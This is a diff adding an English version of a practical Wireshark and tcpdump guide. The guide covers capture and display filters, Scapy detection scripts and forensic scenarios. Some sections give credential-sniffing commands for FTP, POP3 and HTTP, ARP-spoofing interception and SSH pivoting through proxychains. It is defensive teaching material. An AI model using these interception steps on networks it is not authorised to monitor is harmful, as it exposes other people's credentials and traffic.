@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 패킷 분석 — Wireshark & tcpdump 실전 가이드
 
 ## 1. 패킷 분석 기초
@@ -1154,4 +1160,1166 @@ Capture → Options → Add new interfaces → Remote interfaces
   Host: 원격 IP
   Port: 2002 (기본값)
   → 원격 서버의 트래픽을 로컬 Wireshark에서 분석
+```
+
+---
+
+<a name="english"></a>
+
+# Packet Analysis — Wireshark & tcpdump Practical Guide
+
+## 1. Packet Analysis Basics
+
+### Packet Capture Tool Comparison
+| Tool | Environment | Features |
+|------|-------------|----------|
+| Wireshark | GUI | Powerful filtering, protocol decoding |
+| tcpdump | CLI | Lightweight and fast, scriptable |
+| tshark | CLI | Wireshark CLI version |
+| Zeek (Bro) | CLI | Advanced network analysis |
+| NetworkMiner | GUI | Forensics-focused |
+
+---
+
+## 2. Complete tcpdump Guide
+
+### Basic Usage
+```bash
+# Basic capture (eth0 interface)
+tcpdump -i eth0
+
+# All interfaces
+tcpdump -i any
+
+# Filter by specific host
+tcpdump -i eth0 host 192.168.1.100
+
+# Filter by specific port
+tcpdump -i eth0 port 80
+tcpdump -i eth0 port 443
+tcpdump -i eth0 'port 80 or port 443'
+
+# Filter by specific protocol
+tcpdump -i eth0 icmp
+tcpdump -i eth0 tcp
+tcpdump -i eth0 udp
+
+# Source/destination filters
+tcpdump -i eth0 src host 192.168.1.100
+tcpdump -i eth0 dst host 192.168.1.1
+tcpdump -i eth0 src port 80
+```
+
+### Advanced Filtering
+```bash
+# Capture only TCP SYN packets (port scan detection)
+tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'
+
+# SYN/ACK packets (scan responses)
+tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'
+
+# Only RST packets (connection refused)
+tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'
+
+# Only HTTP GET requests
+tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+
+# Capture DNS queries
+tcpdump -i eth0 -n port 53
+
+# Only ICMP Echo Requests (ping monitoring)
+tcpdump -i eth0 'icmp[icmptype]=icmp-echo'
+
+# Detect large packets (DoS indicator)
+tcpdump -i eth0 'ip[2:2] > 1000'
+```
+
+### Saving and Reading Files
+```bash
+# Save to pcap file
+tcpdump -i eth0 -w capture.pcap
+
+# Read saved file
+tcpdump -r capture.pcap
+
+# Capture for a specific duration (60 seconds)
+timeout 60 tcpdump -i eth0 -w capture.pcap
+
+# File size limit (rotate every 100MB)
+tcpdump -i eth0 -w capture-%Y%m%d-%H%M%S.pcap -C 100 -G 3600
+```
+
+### Output Format Options
+
+tcpdump is a Linux CLI-based packet capture tool. You can specify capture conditions precisely using BPF (Berkeley Packet Filter) syntax. A common workflow is to save with `-w` to a pcap file and then analyze it in Wireshark.
+
+```bash
+tcpdump -i eth0 -n      # Display IP addresses as numbers (no DNS lookup)
+tcpdump -i eth0 -nn     # Display both IP and port as numbers
+tcpdump -i eth0 -v      # Verbose output
+tcpdump -i eth0 -vv     # More verbose output
+tcpdump -i eth0 -A      # Print payload in ASCII
+tcpdump -i eth0 -X      # Print payload in Hex + ASCII
+tcpdump -i eth0 -xx     # Print Hex including Ethernet header
+tcpdump -i eth0 -e      # Display MAC addresses
+tcpdump -i eth0 -c 100  # Stop after capturing 100 packets
+```
+
+---
+
+## 3. Wireshark Practical Usage
+
+### Key Display Filters
+
+#### Basic Filters
+
+Wireshark display filters are expressions that show only packets matching the desired conditions from captured traffic. Logical operators `&&` (AND), `||` (OR), and `!` (NOT) can be combined to quickly trace specific communication sessions.
+
+```
+ip.addr == 192.168.1.100      # specific IP
+ip.src == 192.168.1.100       # source IP
+ip.dst == 192.168.1.100       # destination IP
+tcp.port == 80                # port number
+tcp.dstport == 443            # destination port
+udp.port == 53                # UDP port
+
+# AND / OR / NOT
+ip.src == 192.168.1.1 && tcp.port == 80
+ip.addr == 192.168.1.1 || ip.addr == 10.0.0.1
+!arp                          # exclude ARP packets
+```
+
+#### Protocol Filters
+```
+http                          # HTTP protocol
+https or ssl or tls           # HTTPS/TLS
+dns                           # DNS
+arp                           # ARP
+icmp                          # ICMP (ping, etc.)
+smtp                          # email
+ftp                           # FTP
+ssh                           # SSH
+```
+
+#### TCP Flag Filters
+```
+tcp.flags.syn == 1            # SYN packets
+tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN only (port scan detection)
+tcp.flags.rst == 1            # RST packets
+tcp.flags.fin == 1            # FIN packets
+tcp.analysis.retransmission   # retransmitted packets
+```
+
+#### HTTP Analysis
+```
+http.request.method == "GET"
+http.request.method == "POST"
+http.response.code == 200     # success response
+http.response.code == 404     # page not found
+http.response.code == 500     # server error
+http.request.uri contains "admin"  # URI contains "admin"
+http contains "password"      # "password" string in packet
+```
+
+### Follow TCP Stream (Key to Plaintext Analysis)
+1. Right-click an HTTP packet → Follow → TCP Stream
+2. Reconstruct full plaintext content of FTP, Telnet, HTTP
+3. View credentials, file contents, and more
+
+### Using Statistics
+```
+Statistics → Protocol Hierarchy    # protocol ratio analysis
+Statistics → Conversations         # list of communication sessions
+Statistics → IO Graph              # traffic graph
+Statistics → HTTP → Requests       # list of HTTP requests
+```
+
+---
+
+## 4. What Packet Capture Can Reveal
+
+### Extracting FTP Credentials
+
+FTP transmits credentials in plaintext, so a packet capture alone can reveal usernames and passwords. In a switched environment, you must intercept traffic using ARP spoofing or SPAN port mirroring.
+
+```bash
+# Capture FTP credentials with tcpdump
+tcpdump -i eth0 -A 'tcp port 21'
+
+# Wireshark filter
+ftp contains "USER" or ftp contains "PASS"
+
+# Output example:
+# USER admin
+# PASS password123
+```
+
+### HTTP Basic Authentication Credentials
+
+HTTP Basic authentication transmits credentials encoded in Base64. Since Base64 is not encryption, once a packet is captured, it can be decoded immediately to recover the original account information.
+
+```bash
+# Capture HTTP Authorization header
+tcpdump -i eth0 -A 'tcp port 80' | grep -i "authorization:"
+
+# Base64 decode
+echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
+# admin:password
+```
+
+### DNS Query Analysis (C2 Communication Detection)
+```bash
+# Detect abnormally high DNS query volume
+tcpdump -i eth0 -n port 53 | awk '{print $9}' | sort | uniq -c | sort -rn | head -20
+
+# Detect DNS tunneling (long subdomains)
+tshark -r capture.pcap -T fields -e dns.qry.name | awk 'length > 50' | sort | uniq
+```
+
+### Scapy PCAP Analyzer (Python)
+
+```python
+#!/usr/bin/env python3
+"""
+Multi-layer PCAP analyzer — detects port scans, ARP spoofing, DNS tunneling, and credential patterns
+Usage: python3 pcap_analyzer.py capture.pcap [-v]
+"""
+import argparse
+import re
+import sys
+from collections import Counter, defaultdict
+from datetime import datetime
+from pathlib import Path
+
+try:
+    from scapy.all import (
+        rdpcap, IP, TCP, UDP, ARP, DNS, DNSQR, Raw,
+        Ether, ICMP,
+    )
+except ImportError:
+    sys.exit("[!] scapy is required: pip3 install scapy")
+
+
+# ── analysis functions ──────────────────────────────────────────
+
+def detect_port_scan(packets: list, threshold: int = 15) -> list[dict]:
+    """Detect access to many ports from a single source in a short time."""
+    # {src_ip: {dst_port}}
+    scan_map: defaultdict[str, set] = defaultdict(set)
+    for pkt in packets:
+        if pkt.haslayer(TCP) and pkt.haslayer(IP):
+            tcp = pkt[TCP]
+            ip = pkt[IP]
+            if tcp.flags & 0x02:  # SYN
+                scan_map[ip.src].add(tcp.dport)
+
+    results = []
+    for src, ports in scan_map.items():
+        if len(ports) >= threshold:
+            results.append({
+                "type": "port scan",
+                "src": src,
+                "port_count": len(ports),
+                "sample_ports": sorted(ports)[:10],
+            })
+    return results
+
+
+def detect_arp_spoof(packets: list) -> list[dict]:
+    """Detect ARP spoofing where multiple MACs appear for the same IP."""
+    ip_mac: defaultdict[str, set] = defaultdict(set)
+    for pkt in packets:
+        if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # ARP Reply
+            arp = pkt[ARP]
+            if arp.psrc and arp.psrc != "0.0.0.0":
+                ip_mac[arp.psrc].add(arp.hwsrc.lower())
+
+    return [
+        {"type": "ARP spoofing", "ip": ip, "macs": list(macs)}
+        for ip, macs in ip_mac.items()
+        if len(macs) > 1
+    ]
+
+
+def detect_dns_tunneling(packets: list, min_length: int = 50) -> list[dict]:
+    """Detect abnormally long DNS query names (tunneling indicators)."""
+    findings: list[dict] = []
+    for pkt in packets:
+        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
+            try:
+                qname = pkt[DNSQR].qname.decode("utf-8", errors="replace").rstrip(".")
+                if len(qname) >= min_length:
+                    findings.append({
+                        "type": "suspected DNS tunneling",
+                        "src": pkt[IP].src if pkt.haslayer(IP) else "?",
+                        "query": qname,
+                        "length": len(qname),
+                    })
+            except Exception:
+                continue
+    return findings
+
+
+def extract_credentials(packets: list) -> list[dict]:
+    """Extract credential patterns from plaintext protocols (FTP/HTTP/SMTP)."""
+    creds: list[dict] = []
+    patterns = {
+        "FTP_USER": re.compile(rb"USER\s+(\S+)", re.IGNORECASE),
+        "FTP_PASS": re.compile(rb"PASS\s+(\S+)", re.IGNORECASE),
+        "HTTP_AUTH": re.compile(rb"Authorization:\s+Basic\s+(\S+)", re.IGNORECASE),
+        "HTTP_FORM": re.compile(rb"(?:password|passwd|pwd)=([^&\s]+)", re.IGNORECASE),
+        "SMTP_AUTH": re.compile(rb"AUTH LOGIN|AUTH PLAIN", re.IGNORECASE),
+    }
+    for pkt in packets:
+        if not pkt.haslayer(Raw):
+            continue
+        payload: bytes = pkt[Raw].load
+        src = pkt[IP].src if pkt.haslayer(IP) else "?"
+        for name, pattern in patterns.items():
+            match = pattern.search(payload)
+            if match:
+                value = match.group(1).decode("utf-8", errors="replace")[:40] if match.lastindex else "detected"
+                creds.append({"type": name, "src": src, "value": value})
+    return creds
+
+
+def protocol_stats(packets: list) -> dict[str, int]:
+    """Count packets by protocol."""
+    stats: Counter = Counter()
+    for pkt in packets:
+        if pkt.haslayer(TCP):   stats["TCP"] += 1
+        elif pkt.haslayer(UDP): stats["UDP"] += 1
+        elif pkt.haslayer(ICMP): stats["ICMP"] += 1
+        elif pkt.haslayer(ARP): stats["ARP"] += 1
+        else:                   stats["Other"] += 1
+    return dict(stats)
+
+
+# ── main ───────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Multi-layer PCAP analyzer — port scan / ARP spoofing / DNS tunneling / credential detection",
+    )
+    parser.add_argument("pcap", help=".pcap / .pcapng file to analyze")
+    parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
+    parser.add_argument("--scan-threshold", type=int, default=15,
+                        help="minimum port count for port scan detection (default: 15)")
+    parser.add_argument("--dns-min-len", type=int, default=50,
+                        help="minimum query length for DNS tunneling suspicion (default: 50)")
+    args = parser.parse_args()
+
+    pcap_path = Path(args.pcap)
+    if not pcap_path.exists():
+        sys.exit(f"[!] file not found: {pcap_path}")
+
+    print(f"[*] loading: {pcap_path}  ({pcap_path.stat().st_size // 1024} KB)")
+    try:
+        packets = rdpcap(str(pcap_path))
+    except Exception as e:
+        sys.exit(f"[!] PCAP read error: {e}")
+
+    print(f"[*] total packets: {len(packets)}\n")
+
+    # protocol statistics
+    stats = protocol_stats(packets)
+    print("[*] protocol distribution")
+    for proto, count in sorted(stats.items(), key=lambda x: -x[1]):
+        print(f"    {proto:<8}  {count:>6}")
+
+    # run detections
+    for findings, label in [
+        (detect_port_scan(packets, args.scan_threshold), "port scan"),
+        (detect_arp_spoof(packets), "ARP spoofing"),
+        (detect_dns_tunneling(packets, args.dns_min_len), "DNS tunneling"),
+        (extract_credentials(packets), "credentials"),
+    ]:
+        print(f"\n[*] {label} detections: {len(findings)}")
+        for f in findings[:10]:  # show up to 10
+            if args.verbose:
+                print(f"    {f}")
+            else:
+                summary = f.get("src", "") or f.get("ip", "")
+                detail = (
+                    f.get("port_count") or f.get("macs") or
+                    f.get("query", "")[:40] or f.get("value", "")
+                )
+                print(f"    [{f['type']}] {summary}  →  {detail}")
+        if len(findings) > 10:
+            print(f"    ... and {len(findings) - 10} more")
+
+    print(f"\n[*] analysis complete: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Understanding Wireshark Color Rules
+
+| Color | Meaning |
+|-------|---------|
+| Black background, red text | Error packets (checksum mismatch, etc.) |
+| Blue background | General info: DNS, ARP, etc. |
+| Light green | HTTP traffic |
+| Gray | TCP traffic |
+| Yellow | Warnings (retransmissions, out-of-order) |
+| Purple | TCP RST, FIN |
+
+---
+
+## 6. Practical Packet Analysis Scenarios
+
+### Scenario 1: Port Scan Detection
+```
+Symptoms: Large volume of SYN packets, most responded to with RST
+
+Wireshark filter:
+  tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+Analysis points:
+  1. Same source IP, destination port incrementing sequentially
+  2. Hundreds to thousands of SYN packets in a short time
+  3. High ratio of SYN/RST responses (closed ports)
+  4. SYN/SYN+ACK response = open port
+```
+
+### Scenario 2: ARP Spoofing Detection
+```
+Symptoms: ARP Replies with different MAC addresses for the same IP
+
+Wireshark filter:
+  arp.opcode == 2  (ARP Reply only)
+
+Analysis points:
+  1. Two or more MAC addresses responding for the same IP
+  2. Consecutive ARP Replies in rapid succession
+  3. Pay special attention to duplicate responses for gateway IP
+```
+
+### Scenario 3: Password Sniffing
+```
+Capture environment: In a switched environment, a mirroring (SPAN) port is required
+                     In a hub environment, capture is possible directly
+
+Wireshark filter (FTP):
+  ftp.request.command == "USER" or ftp.request.command == "PASS"
+
+Wireshark filter (HTTP form):
+  http.request.method == "POST" && http contains "password"
+
+tshark automatic extraction:
+  tshark -r capture.pcap -Y "ftp.request.command" -T fields -e ftp.request.arg
+```
+
+---
+
+## 7. SSH Tunneling & Port Forwarding
+
+### Local Port Forwarding
+
+SSH port forwarding is a technique to bypass firewalls and NAT to access internal services through a remote server. There are three methods: `-L` (local), `-R` (reverse), and `-D` (SOCKS proxy). It is a key technique for internal network pivoting in penetration testing.
+
+```bash
+# Local port 8080 → server's port 80 (firewall bypass)
+ssh -L 8080:localhost:80 user@server.com
+
+# Access internal network server (jump host)
+ssh -L 3389:internal.host:3389 user@jumphost.com
+
+# Connect from browser via http://localhost:8080
+```
+
+### Reverse Port Forwarding (Firewall Bypass)
+
+SSH port forwarding is a technique to bypass firewalls and NAT to access internal services through a remote server. The `-R` (reverse) method allows a public server to forward traffic to a machine behind NAT.
+
+```bash
+# Server's 2222 → local 22 (access server behind NAT)
+ssh -R 2222:localhost:22 user@public.server.com
+
+# SSH to the internal server from the public server
+ssh -p 2222 localhost
+```
+
+### SOCKS Proxy (Dynamic Port Forwarding)
+
+SSH dynamic port forwarding creates a SOCKS proxy, allowing all traffic to be routed through the SSH tunnel. This is central to pivoting in penetration tests.
+
+```bash
+# Create SOCKS5 proxy via SSH
+ssh -D 1080 user@server.com
+
+# ProxyChains configuration (/etc/proxychains.conf)
+# socks5 127.0.0.1 1080
+
+# Use tools through ProxyChains
+proxychains nmap -sT 10.0.0.1
+proxychains curl http://internal.site/
+```
+
+---
+
+## 8. Advanced Wireshark — Practical Analysis Techniques
+
+### Packet Capture Filters (Applied before capture, BPF syntax)
+```
+# Capture Filter — set before starting Wireshark
+host 192.168.1.100              # capture specific host
+net 192.168.1.0/24              # capture subnet
+port 80                          # port 80
+portrange 1-1024                 # port range
+tcp                              # TCP only
+not arp and not icmp             # exclude ARP and ICMP
+host 10.0.0.1 and port 443      # HTTPS from specific host
+```
+
+### Advanced Display Filters
+```
+# String search
+frame contains "password"        # search string in all packets
+http.request.uri contains "login"
+http.cookie contains "session"
+
+# Comparison operators
+tcp.len > 1000                   # TCP data length
+ip.ttl < 10                      # low TTL packets (loop suspected)
+frame.len > 1500                 # jumbo frames
+
+# Time-based filter
+frame.time_delta > 1.0           # more than 1 second since previous packet
+
+# TCP stream number
+tcp.stream eq 5                  # only TCP stream number 5
+
+# Reassembled packets
+http.request and ip.src != 192.168.1.1
+
+# ICMP type filters
+icmp.type == 8                   # Echo Request (ping)
+icmp.type == 0                   # Echo Reply
+icmp.type == 3                   # Destination Unreachable
+icmp.type == 11                  # Time Exceeded (TTL expired)
+```
+
+### tshark Automated Analysis
+
+tshark is the CLI version of Wireshark, used to automate packet analysis in scripts and pipelines. The `-T fields -e` option extracts specific fields for use in automated intrusion detection or evidence collection.
+
+```bash
+# Extract specific fields only
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port
+
+# List of HTTP request URLs
+tshark -r capture.pcap -Y http.request -T fields \
+    -e ip.src -e http.host -e http.request.uri
+
+# DNS query list (C2 detection)
+tshark -r capture.pcap -Y dns.flags.response==0 \
+    -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -rn
+
+# Extract FTP credentials
+tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" \
+    -T fields -e ftp.request.command -e ftp.request.arg
+
+# Detect suspicious large file transfers
+tshark -r capture.pcap -qz conv,tcp | sort -k5 -rn | head -20
+
+# Convert pcap to JSON (automation pipeline)
+tshark -r capture.pcap -T json > capture.json
+
+# Live capture and analysis simultaneously (pipe)
+tshark -i eth0 -Y "tcp.flags.syn==1 and tcp.flags.ack==0" \
+    -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn
+```
+
+### Real-time Network Anomaly Detection Script (Python)
+
+```python
+#!/usr/bin/env python3
+"""
+Real-time network anomaly detector — monitors SYN floods, port scans, and abnormal ICMP
+Usage: sudo python3 net_monitor.py [-i eth0] [--syn-limit 100]
+"""
+import argparse
+import sys
+import threading
+import time
+from collections import defaultdict
+from datetime import datetime
+
+try:
+    from scapy.all import sniff, IP, TCP, UDP, ICMP, ARP
+except ImportError:
+    sys.exit("[!] scapy is required: pip3 install scapy")
+
+
+class NetworkMonitor:
+    def __init__(self, iface: str, syn_limit: int, scan_limit: int, window: int) -> None:
+        self.iface = iface
+        self.syn_limit = syn_limit      # maximum SYN count in time window
+        self.scan_limit = scan_limit    # port scan detection threshold
+        self.window = window            # aggregation time window (seconds)
+
+        self._lock = threading.Lock()
+        self.stats = {
+            "total": 0, "tcp": 0, "udp": 0,
+            "icmp": 0, "arp": 0, "alerts": 0,
+        }
+        # {src_ip: count}
+        self._syn_counts: defaultdict[str, int] = defaultdict(int)
+        # {src_ip: {dst_port}}
+        self._scan_map: defaultdict[str, set] = defaultdict(set)
+
+        # periodically reset counters
+        self._reset_thread = threading.Thread(target=self._reset_loop, daemon=True)
+        self._reset_thread.start()
+
+    def _reset_loop(self) -> None:
+        while True:
+            time.sleep(self.window)
+            with self._lock:
+                self._syn_counts.clear()
+                self._scan_map.clear()
+
+    def _alert(self, msg: str) -> None:
+        ts = datetime.now().strftime("%H:%M:%S")
+        print(f"\n  [ALERT] {ts}  {msg}")
+        self.stats["alerts"] += 1
+
+    def process(self, pkt) -> None:
+        with self._lock:
+            self.stats["total"] += 1
+
+            if pkt.haslayer(TCP):
+                self.stats["tcp"] += 1
+                tcp = pkt[TCP]
+                ip = pkt[IP] if pkt.haslayer(IP) else None
+                if not ip:
+                    return
+
+                # SYN flood detection
+                if tcp.flags & 0x02 and not (tcp.flags & 0x10):
+                    self._syn_counts[ip.src] += 1
+                    if self._syn_counts[ip.src] == self.syn_limit:
+                        self._alert(
+                            f"suspected SYN flood: {ip.src} → "
+                            f"{self._syn_counts[ip.src]} packets/{self.window}s"
+                        )
+
+                    # port scan detection
+                    self._scan_map[ip.src].add(tcp.dport)
+                    if len(self._scan_map[ip.src]) == self.scan_limit:
+                        self._alert(
+                            f"suspected port scan: {ip.src} → "
+                            f"{len(self._scan_map[ip.src])} ports/{self.window}s"
+                        )
+
+            elif pkt.haslayer(UDP):
+                self.stats["udp"] += 1
+            elif pkt.haslayer(ICMP):
+                self.stats["icmp"] += 1
+            elif pkt.haslayer(ARP):
+                self.stats["arp"] += 1
+
+    def print_stats(self) -> None:
+        s = self.stats
+        print(
+            f"\r  packets: {s['total']:>7}  "
+            f"TCP:{s['tcp']:>6}  UDP:{s['udp']:>6}  "
+            f"ICMP:{s['icmp']:>5}  ARP:{s['arp']:>5}  "
+            f"alerts:{s['alerts']:>4}",
+            end="", flush=True,
+        )
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Real-time network anomaly detector")
+    parser.add_argument("-i", "--iface", default="eth0", help="capture interface (default: eth0)")
+    parser.add_argument("--syn-limit", type=int, default=100,
+                        help="SYN flood alert threshold (default: 100)")
+    parser.add_argument("--scan-limit", type=int, default=20,
+                        help="port scan alert threshold in port count (default: 20)")
+    parser.add_argument("--window", type=int, default=5,
+                        help="aggregation time window in seconds (default: 5)")
+    args = parser.parse_args()
+
+    monitor = NetworkMonitor(args.iface, args.syn_limit, args.scan_limit, args.window)
+    print(f"[*] monitoring started: {args.iface}  |  press Ctrl+C to stop")
+
+    # statistics printer thread
+    def stats_printer() -> None:
+        while True:
+            time.sleep(1)
+            monitor.print_stats()
+
+    threading.Thread(target=stats_printer, daemon=True).start()
+
+    try:
+        sniff(iface=args.iface, prn=monitor.process, store=False)
+    except KeyboardInterrupt:
+        print("\n\n[*] stopped")
+        monitor.print_stats()
+        print()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### pcap File Manipulation Tools
+
+editcap, mergecap, and capinfos are pcap manipulation tools included with the Wireshark package. They are used to split large pcap files, filter by time range, or merge multiple files into one for analysis.
+
+```bash
+# editcap — edit/split pcap
+editcap -c 1000 large.pcap split.pcap      # split into 1000 packets each
+editcap -i 60 large.pcap split.pcap        # split every 60 seconds
+editcap -A "2024-01-01 00:00:00" -B "2024-01-01 01:00:00" large.pcap filtered.pcap
+
+# mergecap — merge pcap files
+mergecap -w merged.pcap capture1.pcap capture2.pcap
+
+# capinfos — pcap file information
+capinfos capture.pcap
+
+# tcpreplay — replay pcap (traffic simulation)
+tcpreplay -i eth0 --mbps=10 capture.pcap
+tcpreplay -i eth0 --loop=5 capture.pcap    # replay 5 times
+```
+
+---
+
+## 9. Network Forensics — Extracting Evidence from Packets
+
+### File Recovery (NetworkMiner Method)
+```bash
+# Extract files in Wireshark
+# File → Export Objects → HTTP (files transferred over HTTP)
+# File → Export Objects → FTP-DATA
+
+# Reconstruct TCP stream files with tcpflow
+apt-get install tcpflow
+tcpflow -r capture.pcap -o output_dir/
+
+# NetworkMiner (GUI)
+# Load pcap → check extracted files in the Files tab
+```
+
+### Email Traffic Analysis
+```bash
+# Capture SMTP commands
+tcpdump -i eth0 -A 'tcp port 25' | grep -E "(MAIL FROM|RCPT TO|DATA|Subject)"
+
+# Wireshark SMTP filters
+# smtp.req.command == "MAIL" or smtp.req.command == "RCPT"
+# smtp contains "Subject:"
+
+# POP3 credentials (plaintext transmission)
+tcpdump -i eth0 -A 'tcp port 110' | grep -E "(USER|PASS)"
+```
+
+### Detecting Abnormal Traffic Patterns
+```
+Port scan indicators:
+  - Large volume of SYN packets in a short time
+  - Various destination ports
+  - Most responses are RST (closed ports)
+
+DoS/DDoS indicators:
+  - Excessive traffic to a specific destination
+  - Same packet pattern repeating
+  - Abnormally high packet rate
+
+DNS tunneling indicators:
+  - Abnormally long domain names (50+ characters)
+  - TXT, NULL record type queries
+  - High DNS query frequency
+
+C2 (Command & Control) communication indicators:
+  - Periodic beacon traffic at regular intervals
+  - Repeated transmission of small amounts of encrypted data
+  - Non-standard ports (HTTP not on port 80)
+  - Domain Generation Algorithm (DGA) patterns
+```
+
+### Wireshark Practical Profile Configuration
+```
+Customize color rules (View → Coloring Rules):
+  - SYN Flood:  tcp.flags.syn==1 and tcp.flags.ack==0  → red background
+  - ARP attack: arp.duplicate-address-detected          → yellow background
+  - Plaintext auth: ftp or http.authorization           → orange background
+  - DNS anomaly: dns and dns.resp.type == 16 (TXT)     → purple background
+
+Save profile: Edit → Configuration Profiles → New
+→ Save filters, columns, and color rules per profile
+```
+
+---
+
+## 10. Practical Packet Tracer Scenarios
+
+### Scenario 4: SQL Injection Traffic Detection
+```
+Wireshark filter:
+  http.request.uri contains "'" or
+  http.request.uri contains "union" or
+  http.request.uri contains "select"
+
+Detection points:
+  1. SQL keywords in GET/POST parameters
+  2. Abnormally large HTTP responses (data dump)
+  3. Repeated error responses from the same IP (500, 302)
+  4. URL-encoded attack patterns (%27, %20UNION%20)
+```
+
+### Scenario 5: Ransomware C2 Communication Detection
+```
+Wireshark filters:
+  # suspicious DNS (DGA domains)
+  dns.qry.name matches "[a-z]{10,}\.com"
+
+  # abnormal HTTPS (unverified certificate domains)
+  tls.handshake.type == 1  (Client Hello)
+  
+  # SMB vulnerability exploitation (EternalBlue)
+  smb2 and tcp.dstport == 445
+
+Detection points:
+  1. Periodic communication with unknown external IPs (beaconing)
+  2. SMB (port 445) scanning within internal network
+  3. Bulk file access patterns (encryption in progress)
+  4. Large outbound data transfers (data exfiltration)
+```
+
+### Scenario 6: Insider Threat Detection
+```
+Wireshark + tshark combination:
+  # access outside business hours
+  tshark -r capture.pcap -Y "frame.time_epoch > 1700000000" \
+      -T fields -e ip.src -e ip.dst | sort | uniq -c
+
+  # large outbound data transfers
+  tshark -r capture.pcap -qz conv,tcp | awk '$6 > 10000000'
+
+  # cloud storage upload detection
+  http.host contains "dropbox" or http.host contains "drive.google" or
+  http.host contains "onedrive"
+```
+
+---
+
+## 11. Wireshark Core Features — Practical Reference
+
+### Packet Capture Methods by Environment
+
+#### Hub Environment
+```
+A hub broadcasts traffic to all ports → simply connecting allows you to capture all traffic
+```
+
+#### Three Methods for Capturing in a Switched Environment
+```
+1. Port Mirroring (SPAN: Switched Port Analyzer)
+   - Copy specific port traffic to an analysis port via switch configuration
+   - Cisco configuration:
+     Switch(config)# monitor session 1 source interface Fa0/1
+     Switch(config)# monitor session 1 destination interface Fa0/2
+
+2. Hubbing Out
+   - Insert a hub between the target host and the switch, then connect the capture device to the hub
+
+3. ARP Cache Poisoning (active, risk of detection)
+   - Use Cain & Abel, arpspoof, etc. to perform ARP spoofing and intercept traffic
+```
+
+### Wireshark Window Layout
+```
+Main window has 3 panels:
+  Packet List Pane   - List of captured packets (number, time, source, destination, protocol, length, info)
+  Packet Details Pane - Detailed layer-by-layer header info for the selected packet (expandable)
+  Packet Bytes Pane  - Raw Hex + ASCII data of the selected packet
+
+Status bar:
+  Left:   Expert Info warning count
+  Center: Currently applied display filter
+  Right:  Total captured packet count
+```
+
+### Display Filter Expression Syntax
+```
+Basic structure: [protocol].[field] [operator] [value]
+
+Comparison operators:
+  ==  eq   (equal)
+  !=  ne   (not equal)
+  >   gt   (greater than)
+  <   lt   (less than)
+  >=  ge   (greater than or equal)
+  <=  le   (less than or equal)
+  contains (contains)
+  matches  (regex match)
+
+Logical operators:
+  &&  and
+  ||  or
+  !   not
+
+Examples:
+  ip.addr == 192.168.1.1 && tcp.port == 80
+  tcp.flags == 0x002               # SYN flag only
+  frame.len >= 100 && frame.len <= 1500
+  http.request.uri matches ".*\.php\?.*"   # PHP parameter request
+```
+
+### Wireshark Expert Info
+```
+Analyze → Expert Info
+ 
+Severity levels:
+  Error   (red)  - checksum errors, malformed packets
+  Warning (yellow) - retransmissions, ACK loss, TCP Reset
+  Note    (teal) - TCP Window Full, Keep-Alive
+  Chat    (blue) - general connection setup/teardown info
+
+Uses:
+  - Quick network problem diagnosis
+  - Surge in retransmissions → line quality issue or DoS
+  - Multiple TCP Resets → ACL blocking or port scan
+```
+
+### Name Resolution
+```
+Wireshark View → Name Resolution:
+
+  Resolve MAC Addresses    - Show manufacturer via OUI (e.g., Apple_xx:xx:xx)
+  Resolve Network Addresses - IP → domain name conversion (reverse DNS lookup)
+  Resolve Transport Names  - Port number → service name (e.g., 80 → http)
+
+Note: Enabling Network Address Resolution generates DNS queries
+     → Creates additional traffic during capture, can confuse analysis results
+     → Recommended to disable during security analysis
+```
+
+### Protocol Dissection
+```
+Analyze → Decode As...
+→ Force interpretation of traffic using non-standard ports
+  Example: Interpret port 8080 traffic as HTTP
+  Example: Force FTP interpretation on non-standard port
+
+Analyze → Enable Protocols...
+→ Enable/disable specific protocol decoders
+```
+
+### Using the Statistics Menu
+```
+Statistics → Protocol Hierarchy
+→ Protocol ratio (packet count, byte count) for entire capture
+→ Suspect if an unusual protocol appears in high proportion
+
+Statistics → Conversations
+→ IP/TCP/UDP session list, sortable by data volume
+→ Useful for tracing the source of large data exfiltration
+
+Statistics → IO Graphs
+→ Time-based traffic graph
+→ Useful for visualizing DDoS and periodic beaconing
+
+Statistics → Flow Graph
+→ Visualize packet flow (TCP connection setup to teardown sequence)
+```
+
+---
+
+## 12. Actual Protocol Behavior as Seen in Packet Analysis
+
+### ARP Behavior Analysis
+```
+Capture ARP in Wireshark:
+  filter: arp
+
+Packet structure:
+  ARP Request: "Who has 192.168.1.1? Tell 192.168.1.100"
+  ARP Reply:   "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
+
+Opcode:
+  1 = ARP Request
+  2 = ARP Reply
+
+Normal: only one MAC responds per IP
+Anomaly: two or more MACs responding for the same IP → suspected ARP spoofing
+```
+
+### DHCP Behavior Analysis
+```
+DORA process:
+  D - Discover: client → broadcast (255.255.255.255)
+  O - Offer:    server → proposes IP to client
+  R - Request:  client → broadcast (announces IP selection)
+  A - Ack:      server → confirms IP assignment to client
+
+Wireshark filters:
+  bootp    # DHCP is based on the BOOTP protocol
+  dhcp.option.dhcp == 3   # DHCP Request
+  dhcp.option.dhcp == 5   # DHCP ACK
+
+Rogue DHCP detection:
+  dhcp.option.dhcp == 2   # suspicious if DHCP Offer comes from multiple servers
